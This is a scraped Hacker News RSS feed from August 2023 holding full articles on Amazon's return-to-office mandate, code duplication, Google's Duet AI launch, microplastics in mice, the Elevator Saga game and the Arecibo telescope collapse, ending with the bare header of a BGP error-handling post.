            <title><![CDATA[Amazon CEO tells staff to work in office 3 days a week or look for another job (123 pts)]]></title>
            <link>https://www.theguardian.com/technology/2023/aug/29/amazon-ceo-staff-work-in-office-job-workers</link>
            <guid>37307032</guid>
            <pubDate>Tue, 29 Aug 2023 12:52:50 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theguardian.com/technology/2023/aug/29/amazon-ceo-staff-work-in-office-job-workers">https://www.theguardian.com/technology/2023/aug/29/amazon-ceo-staff-work-in-office-job-workers</a>, See on <a href="https://news.ycombinator.com/item?id=37307032">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="maincontent"><p>Amazon’s CEO has told workers “it’s probably not going to work out” for them at the tech company unless they are prepared to come into the office at least three days a week.</p><p>Andy Jassy made the statement in a meeting where he made clear his frustration that some employees were not coming in three days a week, despite that being Amazon’s official policy. The comments were first reported by Insider.</p><p>He said: “It’s past the time to disagree and commit. If you can’t disagree and commit … it’s probably not going to work out for you at Amazon because we are going back to the office at least three days a week.”</p><figure id="039faa03-9527-4cf9-ad15-c7cf3686ca09" data-spacefinder-role="richLink" data-spacefinder-type="model.dotcomrendering.pageElements.RichLinkBlockElement"><gu-island name="RichLinkComponent" deferuntil="idle" props="{&quot;richLinkIndex&quot;:3,&quot;element&quot;:{&quot;_type&quot;:&quot;model.dotcomrendering.pageElements.RichLinkBlockElement&quot;,&quot;url&quot;:&quot;https://www.theguardian.com/business/2023/aug/22/work-from-home-revolution&quot;,&quot;text&quot;:&quot;‘The office is for socializing’: how work from home has revolutionized work&quot;,&quot;prefix&quot;:&quot;Related: &quot;,&quot;role&quot;:&quot;richLink&quot;,&quot;elementId&quot;:&quot;039faa03-9527-4cf9-ad15-c7cf3686ca09&quot;},&quot;ajaxUrl&quot;:&quot;https://api.nextgen.guardianapps.co.uk&quot;,&quot;format&quot;:{&quot;display&quot;:0,&quot;theme&quot;:0,&quot;design&quot;:0}}"></gu-island></figure><p>Amazon had instructed its employees to return to the office three times a week starting in May, after previous policies that allowed individual teams to decide whether they came into the office or not. Through <a href="https://www.aboutamazon.co.uk/news/company-news/update-from-andy-jassy-on-return-to-office-plans" data-link-name="in body link">an announcement on the company’s blog</a>, Jessy said the leadership team had decided that it was better for Amazon’s culture and easier to learn from each other and collaborate more effectively when they are in office together.</p><p>This comes after Amazon said it would lay off an additional 9,000 employees, as well as the 18,000 roles it announced it would cut in January.</p><p>Almost <a href="https://www.businessinsider.com/amazon-return-to-office-policy-petition-30000-staff-remote-work-2023-3?r=US&amp;IR=T#:~:text=Almost%2030%2C000%20Amazon%20staff%20signed,return%2Dto%2Doffice%20policy." data-link-name="in body link">30,000 Amazon</a> staff signed an internal petition against the return-to-office mandate in May.</p><p>The petition <a href="https://secure.everyaction.com/fdayaNVWzUmhz_UqcGp0-A2" data-link-name="in body link">read</a>: “Amazon’s top-down, one-size-fits-all RTO [return to office] mandate undermines the diverse, accessible future that we want to be a part of.”</p><p>Amazon employees also participated in a <a href="https://www.theguardian.com/technology/2023/may/31/amazon-workers-walkout-seattle-layoffs" data-link-name="in body link">worldwide walkout</a>, organised by Amazon Employees for Climate Justice and a remote work advocacy group. The walkout was a protest against the company’s slow progress on climate goals and the return to office mandate.</p><p>This month, some Amazon workers in the US reported being <a href="https://www.theguardian.com/technology/2023/aug/11/amazon-starting-to-track-and-penalize-workers-who-work-from-home-too-much" data-link-name="in body link">tracked and penalised</a> for not spending sufficient time in the company’s offices, an email sent to employees revealed.</p><figure data-spacefinder-role="inline" data-spacefinder-type="model.dotcomrendering.pageElements.NewsletterSignupBlockElement"><a data-ignore="global-link-styling" href="#EmailSignup-skip-link-10">skip past newsletter promotion</a><p id="EmailSignup-skip-link-10" tabindex="0" aria-label="after newsletter promotion" role="note">after newsletter promotion</p></figure><p>The emails received by employees noted that staff members were “not currently meeting our expectation of joining your colleagues in the office at least three days a week”, according to <a href="https://www.ft.com/content/7f058b6f-3a2b-4aeb-b77b-dc68102ebd77" data-link-name="in body link">the Financial Times</a>.</p><p>Amazon’s move follows Apple and <a href="https://www.sfchronicle.com/tech/article/Elon-Musk-orders-Twitter-employees-back-to-the-17575090.php" data-link-name="in body link">X’s measures</a> to get employees back in the office, with Apple threatening punitive action against staff who did not return to the office part-time, and the CEO of X, Elon Musk, ordering all employees to be in office unless they had a specific exemption.</p><p>Amazon was contacted for comment.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I don’t buy “duplication is cheaper than the wrong abstraction” (2021) (133 pts)]]></title>
            <link>https://www.codewithjason.com/duplication-cheaper-wrong-abstraction/</link>
            <guid>37306769</guid>
            <pubDate>Tue, 29 Aug 2023 12:31:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.codewithjason.com/duplication-cheaper-wrong-abstraction/">https://www.codewithjason.com/duplication-cheaper-wrong-abstraction/</a>, See on <a href="https://news.ycombinator.com/item?id=37306769">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
			<p><i>Note: If you disagree with what’s expressed in this post, I encourage you to also take a look at my <a href="https://www.codewithjason.com/duplication/">more nuanced and comprehensive post</a> on the topic of code duplication, which gives a more thorough refutation of some of the popular ideas around duplication.</i></p>
<p>“Duplication is cheaper than the wrong abstraction” is a saying I often hear repeated in the Rails community. I don’t really feel like the expression makes complete sense. I fear that it may lead developers to make poor decisions. Here’s what I take the expression to mean, why I can’t completely get on board with it, and what I would advise instead.</p>
<h2>The idea (as I understand it)</h2>
<p>My understanding of the “duplication is cheaper than the wrong abstraction” idea, based on <a href="https://sandimetz.com/blog/2016/1/20/the-wrong-abstraction">Sandi Metz’s post about it</a>, is as follows. When a programmer refactors a piece of code to be less duplicative, that programmer replaces the duplicative code with a new, non-duplicative abstraction. So far so good, perhaps. But, by creating this new abstraction, the programmer signals to posterity that this new abstraction is “the way things should be” and that this new abstraction ought not to be messed with. As a result, this abstraction gets bastardized over time as maintainers of the code need to change it yet simultaneously feel compelled to preserve it. The abstraction gets littered with conditional logic to behave different ways in different scenarios, and eventually becomes an unreadable mess.</p>
<p>I hope this is a fair and reasonably faithful paraphrasing of Sandi’s idea. Here are the parts of the idea that I agree with, followed by the parts of the idea that I take issue with.</p>
<h2>The parts I agree with</h2>
<p>In my experience it’s absolutely true that existing code has a certain inertia to it. Whether it’s out of caution or laziness or some other motive, it seems that a common approach to existing code is “don’t mess with it too much”. This is often a pretty reasonable approach, especially in codebases with poor <a href="https://www.codewithjason.com/test-coverage/">test coverage</a> where broad refactorings aren’t very safe. Unfortunately the “don’t mess with it too much” approach (as Sandi correctly points out) often makes bad code even worse.</p>
<p>I also of course agree that it’s bad when an abstraction gets cluttered up with a bunch of conditional logic to behave differently in different scenarios. Once that happens, the abstraction can hardly be called an abstraction anymore. It’s like two people trying to live in one body.</p>
<p>I also agree with Sandi’s approach to cleaning up poorly-deduplicated code. First, back out the “improvements” and return to the duplicated state. Then begin the de-duplication work anew. Good approach.</p>
<h2>The parts I take issue with</h2>
<h3>What exactly is meant by “the wrong abstraction”?</h3>
<p>I think “the wrong abstraction” is a confused way of referring to poorly-de-duplicated code. Here’s why.</p>
<p>It seems to me that what’s meant by “the wrong abstraction” is “a confusing piece of code littered with conditional logic”. I don’t really see how it makes sense to call that an abstraction at all, let alone the wrong abstraction.</p>
<p>Not every piece of code is an abstraction of course. To me, an <a href="https://www.codewithjason.com/abstraction-in-rails/">abstraction</a> is a piece of code that’s expressed in high-level language so that the distracting details are abstracted away. If I were to see a confusing piece of code littered with conditional logic, I wouldn’t see it and think “oh, there’s an incorrect abstraction”, I would just think, “oh, there’s a piece of crappy code”. It’s neither an abstraction nor wrong, it’s just bad code.</p>
<p>So instead of “duplication is cheaper than the wrong abstraction”, I would say “duplication is cheaper than confusing code littered with conditional logic”. But I actually wouldn’t say that, because I don’t believe duplication is cheaper. I think it’s usually much more expensive.</p>
<h3>When duplication is dearer</h3>
<p>I don’t see how it can be said, without qualification, that duplication is cheaper than the wrong abstraction. Some certain things must be considered. How bad is the duplication? How bad is the de-duplicated code? Sometimes the duplication is cheaper but sometimes it’s more expensive. How do you know unless you know how good or bad each alternative is? It depends on the scenario.</p>
<p>If the duplication is very small and obvious, and the alternative is to create a puzzling mess, then that duplication is absolutely cheaper than the bad code. But if the duplication is horrendous (for example, the same several lines of code duplicated across distant parts of the codebase dozens of times, and with inconsistent names which make the duplication hard to notice or track down) and the alternative is a piece of code that’s merely imperfect, then I would say that the duplication is more expensive.</p>
<p>In general, I find duplication to typically be more much expensive than the de-duplicated alternative. Duplication can bite you, hard. The worst is when there’s a piece of code that’s duplicated but you don’t know it’s duplicated. In that case you risk changing the code in one place without realizing you’re creating an inconsistency. It’s hard for a poor abstraction to have consequences worse than that.</p>
<h3>Programmers’ reluctance to refactor isn’t a good justification for not DRYing up code</h3>
<p>If a programmer “feels honor-bound to retain the existing abstraction” (to quote Sandi’s post), then to me that sounds like a symptom of a problem that’s distinct from duplication or bad abstractions. If developers are afraid to clean up poor code, then I don’t think the answer is to hold off on fixing duplication problems. I think the answer is to address the reasons why developers are reluctant to clean up existing code. Maybe that reason is a lack of automated tests and code review, or a lack of a culture of <a href="https://openpracticelibrary.com/practice/code-review/">collective ownership</a>. Whatever the underlying problem is, fixing that problem surely must be a better response than allowing duplication to live in your codebase.</p>
<h2>My alternative take, summarized</h2>
<p>Instead of “duplication is cheaper than the wrong abstraction”, I would say the following.</p>
<p>Duplication is bad. In fact, duplication is one of the most dangerous mistakes in coding. Except in very minor cases, duplication is virtually always worth fixing. But not all possible ways of addressing duplication are equally good. Don’t replace a piece of duplicative code with a confusing piece of code that’s made out of if statements.</p>
<p>When you find yourself adding if statements to a piece of code in order to get it to behave differently under different scenarios, you’re creating a confusion. Don’t try to make one thing act like two things. Instead, separate it into two things.</p>
<p>If you feel reluctant to modify someone else’s code, ask why that is. Is it because you feel like you’ll get in trouble if you do? Is it because you don’t understand the code, and there’s little test coverage, and you’re afraid you’ll break something if you make changes that are too drastic? Whatever the underlying reason for your reluctance is, it’s a problem, because it’s holding your organization back from improving its code. Instead of adding more bad code on top of the existing bad code, see if there’s anything you can do to try to address these underlying issues.</p>
<h2>Takeaways</h2>
<ul>
<li>As Sandi Metz says (but in my words), confusing code littered with conditionals is not a good way to address duplicative code.</li>
<li>A piece of code filled with conditionals isn’t really an abstraction or even “wrong”, it’s just a confusing piece of code.</li>
<li>Duplication is one of the most dangerous mistakes in coding, and almost always worth fixing. Unless someone really botches the job when de-duplicating a piece of code, the duplicated version is almost always more expensive to maintain than the de-duplicated version.</li>
<li>Try to foster a culture of collective ownership in your organization so that developers aren’t afraid to question or change existing code when the existing code gets out of sync with current needs.</li>
<li>Try to use risk-mitigating practices like automated testing, small changes, and continuous deployment so that when refactorings are needed, you’re not afraid to do them.</li>
</ul>
					</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Duet AI for Google Workspace Now Available (135 pts)]]></title>
            <link>https://workspace.google.com/blog/product-announcements/duet-ai-in-workspace-now-available</link>
            <guid>37306530</guid>
            <pubDate>Tue, 29 Aug 2023 12:11:12 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://workspace.google.com/blog/product-announcements/duet-ai-in-workspace-now-available">https://workspace.google.com/blog/product-announcements/duet-ai-in-workspace-now-available</a>, See on <a href="https://news.ycombinator.com/item?id=37306530">Hacker News</a></p>
<div id="readability-page-1" class="page"><div jsname="tx2NYc"><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><p>Today we’re making <a href="https://workspace.google.com/blog/product-announcements/duet-ai">Duet AI for Google Workspace</a> generally available, and you can <a href="https://inthecloud.withgoogle.com/duet-ai-ga-contact-sales-form/register.html">get started now with a no-cost trial</a>. With over 3 billion users and more than 10 million paying customers who rely on it every day to get things done, Google Workspace is the world’s most popular productivity tool. Our pioneering technology makes collaborating with people easy, fun, and ubiquitously available. With the <a href="https://workspace.google.com/blog/product-announcements/duet-ai">introduction of Duet AI</a>, we added AI as a real-time collaborator. Since its launch, thousands of companies and more than a million trusted testers have used Duet AI as a powerful collaboration partner that can act as a coach, source of inspiration, and productivity booster — all while ensuring every user and organization has <a href="https://workspace.google.com/blog/identity-and-security/protecting-your-data-era-generative-ai">control over their data</a>.&nbsp;</p><h3>Introducing the next wave of AI innovation in Workspace</h3><p>Sometimes it feels like there isn’t enough time in the day — with so much email, so many meetings, and countless action items to follow up on, work can feel daunting. What if you had an intelligent, real-time collaboration partner that dramatically reduced that burden? With Duet AI, you get to focus on what really matters while it can take care of the rest.&nbsp;</p><p>So let’s see how Duet AI can help you in your daily life. Imagine you’re a financial analyst and you get an email at 5 PM from your boss asking for a presentation on Q3 performance by 8 AM tomorrow — we’ve all been there. Instead of scrambling through forecasts in Sheets, P&amp;L Docs, Monthly Business Review Slides, and reading emails from the regional sales leads, you’ll soon be able to simply ask Duet AI to do the heavy lifting with a prompt like “create a summary of Q3 performance.” Duet AI can create a whole new presentation, complete with text, charts, and images, based on your relevant content in Drive and Gmail. A last-minute request that once called for an all-nighter, can now be completed before dinner time. <br></p></span></section><section><figure><section jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img src="https://storage.googleapis.com/gweb-cloudblog-publish/original_images/20623_DuetAI_WS_Blog_SIDEPANEL_v3.gif" alt="https://storage.googleapis.com/gweb-cloudblog-publish/original_images/20623_DuetAI_WS_Blog_SIDEPANEL_v3.gif" jsname="P3Vluc" jsaction="click:HTIlC" loading="lazy"></section></figure><p><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95">Duet AI can reduce the burden of work by generating a summary from your relevant source documents and automatically building a presentation in Slides.</span></p></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><h3>Meetings you’ll love — even the ones you miss</h3><div><p>For many of us, our days are filled with meetings and it can be exhausting to attend so many, or worse, try to catch up on the ones we miss. What if there was a way for Duet AI to make our meetings less fatiguing and more fulfilling?</p><p>The most important part of any meeting is being clearly seen, heard, and understood, but sometimes things can get in the way, like camera and sound quality, a slow internet connection, or language barriers. We’re putting <b>Duet AI in Google Meet</b> to help ensure you look and sound your best with <b>studio look</b>, <b>studio lighting</b>, and <b>studio sound</b>. And because sometimes it’s hard for remote participants to see everyone in the conference room, or their colleagues appear far away and out of focus, we’re rolling out <b>dynamic tiles</b> and <b>face detection</b> that give attendees in a meeting room their own video tile with their name. We’re also launching <b>automatic translated captions</b> for 18 languages; Meet will automatically detect when another language is spoken and display the translation in real time.&nbsp;</p></div><p>And to help you better engage during meetings, we’re removing the burden of note-taking and sending out recaps. <b>Duet AI can capture notes, action items, and video snippets in real time with the new “take notes for me” feature and it will send a summary to attendees after the meeting</b>. It can even help get latecomers up to speed with “<b>summary so far</b>,” which gives a quick snapshot of everything they’ve missed. But what if you can’t make the meeting and have some input to share? With <b>“attend for me” Duet AI will be able to join the meeting on your behalf</b>, delivering your message and ensuring you get the recap.</p></span></section><section><figure><section jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img src="https://storage.googleapis.com/gweb-cloudblog-publish/original_images/20623_DuetAI_WS_Blog_MEET_v4_2.gif" alt="https://storage.googleapis.com/gweb-cloudblog-publish/original_images/20623_DuetAI_WS_Blog_MEET_v4_2.gif" jsname="P3Vluc" jsaction="click:HTIlC" loading="lazy"></section></figure><p><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95">Duet AI can make your next meeting more productive with an automatically generated&nbsp; meeting summary and action items for you to send out as a recap to participants.</span></p></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><h3>Staying connected just got easier</h3><p>Not every conversation needs a meeting, and sometimes collaboration happens on the go. You might just need a quick chat to connect with your team or solve a problem. Google Chat now makes that a whole lot easier with a <b>refreshed user interface</b>, <b>new shortcuts</b>, and <b>enhanced search</b> that let you stay on top of conversations. You can also <b>chat directly with Duet AI</b> to ask questions about your content, get a summary of documents shared in a space, and catch up on missed conversations.</p><p>When you need to talk it through in real time, you can switch to voice in an instant with <b>huddles in Chat</b>, right from the space where you’re already collaborating. Huddles are audio-first, impromptu gatherings powered by Meet that help distributed teams come together in real time without having to jump into a separate scheduled meeting. We’re also making it easier to build larger communities across Chat, with <b>support for up to 500,000 participants</b>. And for those times when you need to respond to a timely email but you’re on the move, or focused on a top priority, <b>we’re </b><b>enhancing smart reply</b> in Gmail with Duet AI, allowing you to draft longer personalized replies — with a single tap.</p></span></section><section><figure><section jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img src="https://storage.googleapis.com/gweb-cloudblog-publish/original_images/20623_DuetAI_WS_Blog_CHAT_v4B.gif" alt="https://storage.googleapis.com/gweb-cloudblog-publish/original_images/20623_DuetAI_WS_Blog_CHAT_v4B.gif" jsname="P3Vluc" jsaction="click:HTIlC" loading="lazy"></section></figure><p><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95">A refreshed user interface and huddles in Chat can make it easier to connect with your team and come together in real time for impromptu gatherings.</span></p></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><h3>How we're protecting your Workspace data in the era of generative AI</h3><p>In Workspace, we’ve always held user privacy and security at the very core of what we do. With Duet AI, <a href="https://workspace.google.com/blog/identity-and-security/protecting-your-data-era-generative-ai">we continue that promise</a>, and you can rest assured that your interactions with Duet AI are private to you. No other user will see your data and Google does not use your data to train our models without your permission. Building on these core commitments, we recently <a href="https://workspace.google.com/blog/identity-and-security/accelerating-zero-trust-and-digital-sovereignty-ai">announced new capabilities</a> to help prevent cyber threats, provide safer work with built-in zero trust controls, and better support our customers’ digital sovereignty and compliance needs.</p><h3>Growing the thriving ecosystem around Workspace</h3><p>Organizations are already collaborating and getting work done in Workspace, and they want their favorite third-party apps to work there as well so they can get more done in a single place. Workspace has always been an open ecosystem, and we remain committed to its growth through partnerships with trusted technology providers. And this includes partners who are innovating with generative AI. For example, we’re working with <a href="https://www.typeface.ai/">Typeface</a> and <a href="http://jasper.ai/">Jasper</a> to enable marketers to use generative AI to create personalized content at scale, right within Workspace.&nbsp;</p></span></section><section><figure><section jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img src="https://storage.googleapis.com/gweb-cloudblog-publish/images/Screenshot_2023-08-22_at_3.41.23_PM.max-1100x1100.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/Screenshot_2023-08-22_at_3.41.23_PM.max-1100x1100.png" jsname="P3Vluc" jsaction="click:HTIlC" loading="lazy"></section></figure><p><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95">We’re partnering with a growing list of trusted technology providers to help users simplify workflows and tap into innovative tools.</span></p></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><h3>Get started today with Duet AI </h3><p>Google has been responsibly bringing AI to life for over a decade in ways that delight and help our users. With Duet AI, we’re now helping people get back to the best parts of their jobs, to the parts that rely on human creativity, ingenuity, and expertise. And because Duet AI works alongside the tools you already use, it’s easy to get started, even if you’re using another productivity solution. <b>Try out this new way of working today </b>with a <a href="https://inthecloud.withgoogle.com/duet-ai-ga-contact-sales-form/register.html">no-cost trial</a>.</p></span></section><section><span>Posted in</span><ul><li><a href="https://workspace.google.com/blog/product-announcements" data-g-event="tag list: body" data-g-action="product announcements" data-g-label="https://workspacegooglecom/blog/product-announcements">Product Announcements</a></li><li><a href="https://workspace.google.com/blog/ai-and-machine-learning" data-g-event="tag list: body" data-g-action="ai and machine learning" data-g-label="https://workspacegooglecom/blog/ai-and-machine-learning">AI and Machine Learning</a></li></ul></section></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[New study finds microplastics infiltrate all systems of body, alter behaviour (265 pts)]]></title>
            <link>https://www.sustainableplastics.com/news/microplastics-found-pass-blood-brain-barrier-even-though-ingested-drinking-water</link>
            <guid>37306427</guid>
            <pubDate>Tue, 29 Aug 2023 11:59:43 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.sustainableplastics.com/news/microplastics-found-pass-blood-brain-barrier-even-though-ingested-drinking-water">https://www.sustainableplastics.com/news/microplastics-found-pass-blood-brain-barrier-even-though-ingested-drinking-water</a>, See on <a href="https://news.ycombinator.com/item?id=37306427">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="articleBody" data-block-plugin-id="entity_field:node:field_paragraphs">
<p>A news study conducted by University of Rhode Island Professor Jaime Ross investigating the infiltration of microplastics in mammals has revealed that this is far more widespread than initially thought. In fact, the plastic particles were found to bioaccumulate in every organ, including, startlingly enough, the brain.</p>

<p>Microplastics are among the most pervasive pollutants on the planet. They have been <a href="https://www.sustainableplastics.com/news/its-raining-plastic-say-researchers" data-omnilocation="articlebody" data-omnilink="editorial-link">discovered in the air</a>, in <a href="https://www.sustainableplastics.com/news/microplastics-pollution-levels-thames-are-devastating-aquatic-life" data-omnilocation="articlebody" data-omnilink="editorial-link">water systems </a>and food chains around the world. While their negative impacts on marine organisms have been established, few studies have examined the potential health impacts on mammals.</p>

<p>“Research on the health effects of microplastics, especially in mammals, is still very limited,” said Ross, an assistant professor of biomedical and pharmaceutical sciences at the Ryan Institute for Neuroscience and the College of Pharmacy.</p>

<p>The study noted that humans are exposed to microplastics&nbsp; through the consumption of ‘water, seafood, consumer products (clothes, toothpaste, salt, sugar, honey, beer, anything stored in plastic bottles, plastic wrap, or cans/cartons lined with plastic), and via inhalation from textiles, synthetic rubber tires, and plastic covers’. They have been detected, among others, in <a href="https://www.sustainableplastics.com/news/dutch-study-finds-microplastics-human-blood-first-time" data-omnilocation="articlebody" data-omnilink="editorial-link">blood</a> and even breast milk - findings that warrant more investigation into the health outcomes of such exposure in mammals. Currently, there are limited studies that address the potential adverse effects of exposure to MPs on brain health in mammals and even fewer studies that consider age as an additional factor that may impact the outcome of exposure to microplastics - the reason Ross and her team chose to focus on neurobehavioral effects and inflammatory response to exposure to microplastics, as well as the accumulation of microplastics in tissues. Together with graduate students Lauren Gaspar and Sydney Bartman, she examined the biological and cognitive consequences of exposure to microplastics in mice.</p>

<p>The drinking water of a diverse group of older and younger mice was spiked with microplastics over a period of three weeks - with ‘striking’ results, said Ross. The researchers found that exposure to microplastics - in this case, fluorescent polystyrene particles -&nbsp; induced both behavioural changes and alterations in immune markers in liver and brain tissues. The mice in the study began to move peculiarly, and to exhibit behaviours reminiscent of dementia in humans. The results were even more profound in older animals.</p>

<p>“These were not high doses of microplastics, but in only a short period of time, we saw these changes,” Ross said. “Nobody really understands the life cycle of these microplastics in the body, so part of what we want to address is the question of what happens as you get older. Are you more susceptible to systemic inflammation from these microplastics as you age? Can your body get rid of them as easily? Do your cells respond differently to these toxins?”</p>

<p>After three weeks, dissection of the mice revealed that the ingested PS micro-particles had infiltrated every every tissue sample - liver, kidney, gastrointestinal tract, lung, spleen, heart, and brain tissues from both young and old exposed mice&nbsp; - tested. The particles were also observed in the mice’s bodily wastes.</p>

<p>“The detection of MPs in tissues such as the heart and lungs … suggests that the PS-MPs (polystyrene microplastics) are going beyond the digestive system and likely undergoing systemic circulation,” the authors write. An observation they note that is further supported by the detection of microplastics in urine and the brain, indicating they can pass the blood–brain barrier.</p>

<p>That brain infiltration also may cause a decrease in glial fibrillary acidic protein, called “GFAP”, a protein that supports many cell processes in the brain, results have shown. Previous studies have suggested that GFAP expression might decrease in early stages of some neurodegenerative diseases, such as Alzheimer’s disease, or in younger patients with depression disorders.</p>

<p>What is especially concerning is the fact that these changes were seen after just three weeks of exposure to microplastics. As human exposure today is inevitable it is therefore essential to better understand their toxicity to limit their impact on human health. The present study, showed that in just three weeks, polystyrene particles measuring 0.1 and 2 μm can reduce cell viability, translocate throughout the body, accumulate in tissues including brain tissue, markedly modify behaviour in mice, and significantly alter immune markers in both the liver and the brain. Additionally, the effects of exposure seem to be age-dependent.</p>

<p>Future work is needed to examine these factors in order to understand the mechanisms behind these effects and the changes seen with age, said Ross.</p>

<p>“We want to understand how plastics may change the ability for the brain to maintain its homeostasis or how exposure may lead to neurological disorders and diseases, such as Alzheimer’s disease,” she said.</p>

<p>The study was published in the International Journal of Molecular Science. It was supported by the Rhode Island Medical Research Foundation, Roddy Foundation, Plastics Initiative, URI College of Pharmacy, George and Anne Ryan Institute for Neuroscience, and the Rhode Island Institutional Development Award (IDeA) Network of Biomedical Research Excellence from the National Institute of General Medical Sciences of the National Institutes of Health.</p>

<p><i>Int. J. Mol. Sci.</i> 2023, <i>24</i>(15), 12308; <a href="https://doi.org/10.3390/ijms241512308" data-omnilocation="articlebody" data-omnilink="editorial-link">https://doi.org/10.3390/ijms241512308</a></p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Elevator Saga: An elevator programming game (2015) (114 pts)]]></title>
            <link>https://play.elevatorsaga.com/index.html</link>
            <guid>37306262</guid>
            <pubDate>Tue, 29 Aug 2023 11:43:00 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://play.elevatorsaga.com/index.html">https://play.elevatorsaga.com/index.html</a>, See on <a href="https://news.ycombinator.com/item?id=37306262">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <div>
            
            <p><a href="https://github.com/magwo/elevatorsaga/wiki/">Wiki &amp; Solutions</a>
            <a href="https://play.elevatorsaga.com/documentation.html#docs">Documentation</a>
            <a href="https://play.elevatorsaga.com/documentation.html">Help</a>
        </p></div>

        

        

        <div>
                <p><span>Transported</span><span></span></p>
                <p><span>Elapsed time</span><span></span></p>
                <p><span>Transported/s</span><span></span></p>
                <p><span>Avg waiting time</span><span></span></p>
                <p><span>Max waiting time</span><span></span></p>
                <p><span title="Number of floors that have been travelled by elevators">Moves</span><span></span></p>
            </div>

        
        
        

        <p>
            <h3>Confused? Open the <a href="https://play.elevatorsaga.com/documentation.html">Help and API documentation</a> page</h3>
        </p>
        <p>
            <h4>Made by Magnus Wolffelt and contributors</h4>
            <h4>Version <span>1.6.5</span></h4>
            <h4><a href="https://github.com/magwo/elevatorsaga">Source code</a> on GitHub</h4>
            <h4><a href="https://play.elevatorsaga.com/test/index.html">Run tests</a></h4>
        </p>
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Neutrons prove ‘Bond villain’ did not cause Arecibo telescope collapse (115 pts)]]></title>
            <link>https://www.ornl.gov/news/neutrons-prove-bond-villain-did-not-cause-arecibo-telescope-collapse</link>
            <guid>37306055</guid>
            <pubDate>Tue, 29 Aug 2023 11:20:23 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.ornl.gov/news/neutrons-prove-bond-villain-did-not-cause-arecibo-telescope-collapse">https://www.ornl.gov/news/neutrons-prove-bond-villain-did-not-cause-arecibo-telescope-collapse</a>, See on <a href="https://news.ycombinator.com/item?id=37306055">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                    <p><span><span>Inside the failed sockets, the zinc casting that held the cable wires in place experienced significant material flow, or creep, allowing some of the wires to slip. </span></span></p>

<p><span><span>The neutron imaging revealed that the zinc flowed slowly under stress when the splayed-out cable wires alone could no longer resist the tension on the cables. The sockets failed because the zinc continued to flow until the cables entirely pulled out of the sockets. </span></span></p>

<p><span><span>“Our analysis detected significant slippage of wires in the region of interest, on the order of multiple wire diameters,” Brügger said. “This indicates that the wires slipped at some point, but it cannot be surmised whether this slipping occurred during the structural failure event or before.” </span></span></p>

<p><span><span>Although the final report by the forensic engineers concluded that other natural forces had only a negligible effect on the collapse, the earthquakes and hurricanes that impacted Puerto Rico over the years do generally add dynamic loading on such structures. “I suppose you could say the telescope at Arecibo had been shaken <em>and</em> stirred by those events,” Brügger quipped, alluding to James Bond’s favorite drink. </span></span></p>

<p><span><span>HFIR’s MARS CG-1D instrument, formerly named IMAGING, was used to perform high-penetration neutron imaging of the samples.</span></span></p>

<p><span><span>Like X-ray imaging, neutron imaging is very useful in the field of nondestructive testing. Neutrons, however, are ideal for tasks that are difficult or impossible for conventional X-ray imaging, including studying light elements, such as hydrogen and carbon. Neutrons can also penetrate heavy metals, such as lead and titanium, facilitating the study of complex engineering materials in a wide range of sample environments.&nbsp;</span></span></p>

<p><span><span>The <a href="https://www.thorntontomasetti.com/news/arecibo-collapse-forensic-report-released">Thornton Tomasetti report</a>, which includes the neutron analyses, states the two cable failures that occurred before the collapse and the third cable failure that triggered the collapse all happened near or inside zinc-filled sockets at cable ends. Each failure involved both the rupture of some of the cable’s wires and a deformation of the socket’s zinc, and was therefore a failure of the cable/socket assemblies.</span></span></p>

<p><span><span>HFIR is a Department of Energy Office of Science user facility. </span></span></p>

<p><span><span>UT-Battelle manages ORNL for DOE’s Office of Science, the single largest supporter of basic research in the physical sciences in the United States. The Office of Science is working to address some of the most pressing challenges of our time. For more information, please visit&nbsp;<a href="https://www.energy.gov/science/office-science">energy.gov</a>. </span></span></p>
                </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Grave flaws in BGP Error handling (235 pts)]]></title>
            <link>https://blog.benjojo.co.uk/post/bgp-path-attributes-grave-error-handling</link>
            <guid>37305800</guid>
            <pubDate>Tue, 29 Aug 2023 10:51:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.benjojo.co.uk/post/bgp-path-attributes-grave-error-handling">https://blog.benjojo.co.uk/post/bgp-path-attributes-grave-error-handling</a>, See on <a href="https://news.ycombinator.com/item?id=37305800">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<h3>Aug 29 2023</h3>

